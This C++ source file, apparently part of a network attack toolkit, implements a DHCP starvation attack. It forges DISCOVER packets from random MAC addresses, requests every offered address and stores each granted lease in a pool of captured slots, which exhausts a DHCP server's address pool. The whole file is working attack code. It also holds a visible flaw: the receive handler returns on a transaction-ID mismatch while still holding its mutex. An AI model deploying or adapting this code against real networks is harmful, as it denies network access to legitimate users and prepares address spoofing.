#include <iostream>
#include <cstring>
#include <sys/time.h>

#include <actions/Starvation.h>

Starvation::Starvation() {
    pthread_mutex_init(&this->mutex, nullptr);
    pthread_cond_init(&this->cond, nullptr);
}

Starvation::~Starvation() {
    pthread_mutex_destroy(&this->mutex);
    pthread_cond_destroy(&this->cond);
}

void Starvation::action(Core *core) {
    DhcpPacket dhcpPacket{};
    PacketInfo pktInfo{};
    timespec maxWaitCond{};
    netaddr_mac(req);
    int err;

    pthread_mutex_lock(&this->mutex);

    while (this->lastXid != 0) {
        timespec_get(&maxWaitCond, TIMER_ABSTIME);
        maxWaitCond.tv_sec += 10;
        if (pthread_cond_timedwait(&this->cond, &this->mutex, &maxWaitCond) == ETIMEDOUT)
            this->lastXid = 0;
    }

    eth_rndaddr(&req);
    eth_bcast(&pktInfo.phisAddr);
    pktInfo.ipDst.ip = 0xFFFFFFFF;
    pktInfo.toServer = true;

    dhcp_inject_discovery((unsigned char *) &dhcpPacket, &req, nullptr, DHCP_FLAGS_BROADCAST);
    if ((err = core->sendDhcpMsg(&dhcpPacket, DHCPPKTSIZE, &pktInfo)) < 0) {
        std::cerr << "Starvation action: " << spark_strerror(err) << std::endl;
        core->stop = true;
    }
    lastXid = dhcpPacket.xid;
    pthread_mutex_unlock(&this->mutex);
}

void Starvation::recvDhcpMsg(Core *core, PacketInfo *pktInfo, DhcpPacket *dhcp) {
    DhcpPacket packet{};
    DhcpSlot *slot;
    netaddr_mac(chaddr);
    netaddr_ip(ipReq);
    netaddr_ip(serverIp);
    int err;

    pthread_mutex_lock(&this->mutex);

    if (dhcp->xid != this->lastXid)
        return;

    memcpy(chaddr.mac, dhcp->chaddr, ETHHWASIZE);
    ipReq.ip = dhcp->yiaddr;
    serverIp.ip = dhcp->siaddr;

    if (dhcp_type_equals(dhcp, DHCP_OFFER)) {
        dhcp_inject_request((unsigned char *) &packet, &chaddr, &ipReq, this->lastXid, &serverIp, DHCP_FLAGS_BROADCAST);
        pktInfo->ipSrc.ip = ipReq.ip;
        pktInfo->ipDst.ip = serverIp.ip;
        pktInfo->toServer = true;
        if ((err = core->sendDhcpMsg(&packet, DHCPPKTSIZE, pktInfo)) < 0) {
            std::cerr << "Starvation action(request): " << spark_strerror(err) << std::endl;
            core->stop = true;
        }

    } else if (dhcp_type_equals(dhcp, DHCP_ACK)) {
        slot = new DhcpSlot;
        slot->clientIp.ip = ipReq.ip;
        memcpy(slot->clientMac.mac, dhcp->chaddr, ETHHWASIZE);
        slot->serverIp.ip = serverIp.ip;
        slot->serverMac = pktInfo->phisAddr;
        gettimeofday(&slot->timeStamp, nullptr);
        slot->lease = ntohl(dhcp_get_option_uint(dhcp, DHCP_ADDR_LEASE_TIME));

        printf("Ip: %s mac: %s\n", ip_getstr(&slot->clientIp, true), eth_getstr(&slot->clientMac, true));
        printf("Ip: %s mac: %s\n", ip_getstr(&slot->serverIp, true), eth_getstr(&slot->serverMac, true));
        printf("lease: %d\n", slot->lease);

        core->addToFreeSlot(slot);

        this->lastXid = 0;
        pthread_cond_signal(&this->cond);
    } else if (dhcp_type_equals(dhcp, DHCP_NAK)) {

    }
    pthread_mutex_unlock(&this->mutex);
}
